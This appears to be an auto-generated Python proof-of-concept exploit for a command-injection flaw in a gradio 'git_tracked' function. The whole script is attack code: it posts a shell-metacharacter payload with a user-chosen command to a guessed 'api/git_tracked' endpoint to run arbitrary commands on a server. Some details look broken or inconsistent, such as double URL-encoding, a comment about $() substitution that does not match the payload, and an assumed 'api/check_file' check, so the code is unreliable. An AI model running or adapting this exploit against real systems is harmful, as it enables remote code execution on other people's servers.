#!/usr/bin/env python3
# PoC for gradio_src (/tmp/gradio_src)
# Path: rce-005
# Sink: git_tracked
# Auto-generated — run with: python3 rce_function_git_tracked_uses_git_tracked.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in gradio_src's git_tracked function.

Vulnerability: Command injection via unsanitized user input in subprocess.Popen
with shell=True. The 'demo' and 'file' parameters are directly interpolated into
a shell command string.

Impact: An attacker can execute arbitrary shell commands on the server.

Usage:
    python3 exploit.py --target http://target:port --cmd "touch /tmp/poc_success.txt"
"""

import argparse
import requests
import sys
import urllib.parse

def exploit(target_url, command):
    """
    Exploit the command injection vulnerability in git_tracked.
    
    The vulnerable function constructs:
        f"cd {demo} && git ls-files --error-unmatch {file}"
    
    We inject into the 'file' parameter using shell metacharacters.
    The 'demo' parameter is set to a valid directory (e.g., '.') to satisfy
    the 'cd' command, then we inject our payload in 'file'.
    """
    
    # Ensure target URL has proper format
    if not target_url.endswith('/'):
        target_url += '/'
    
    # The vulnerable endpoint - adjust based on actual API path
    # This is a common pattern for gradio endpoints
    endpoint = target_url + "api/git_tracked"
    
    # Benign payload by default - creates a marker file
    # The injection uses command substitution with $() to execute arbitrary commands
    # We close the git command with ; and then execute our payload
    payload = f"; {command} ;"
    
    # URL encode the payload to ensure proper transmission
    encoded_payload = urllib.parse.quote(payload)
    
    # Construct the full command that will be executed
    # The vulnerable code does: f"cd {demo} && git ls-files --error-unmatch {file}"
    # We set demo to '.' (current directory) and inject in file
    params = {
        "demo": ".",  # Valid directory for cd command
        "file": encoded_payload
    }
    
    print(f"[*] Target: {endpoint}")
    print(f"[*] Payload: {payload}")
    print(f"[*] Command to execute: {command}")
    print("[*] Sending exploit...")
    
    try:
        # Send the request - method depends on the actual API
        # Try POST first (common for gradio APIs)
        response = requests.post(
            endpoint,
            params=params,
            timeout=10,
            headers={"User-Agent": "Mozilla/5.0"}
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        # Check if command was executed by looking for our marker
        if command == "touch /tmp/poc_success.txt":
            # Try to verify the file was created
            verify_response = requests.get(
                target_url + "api/check_file",
                params={"path": "/tmp/poc_success.txt"},
                timeout=5
            )
            if verify_response.status_code == 200:
                print("[+] SUCCESS: Command executed! File /tmp/poc_success.txt created.")
            else:
                print("[?] Could not verify file creation. Check server manually.")
        
        return True
        
    except requests.exceptions.ConnectionError:
        print("[-] Connection error: Could not reach the target.")
        return False
    except requests.exceptions.Timeout:
        print("[-] Timeout: Request timed out.")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in gradio_src git_tracked function"
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Target URL (e.g., http://localhost:7860)"
    )
    parser.add_argument(
        "--cmd",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("Gradio SRC RCE Proof-of-Concept Exploit")
    print("=" * 60)
    print()
    
    success = exploit(args.target, args.cmd)
    
    if success:
        print("\n[+] Exploit completed successfully.")
    else:
        print("\n[-] Exploit failed.")
        sys.exit(1)

if __name__ == "__main__":
    main()
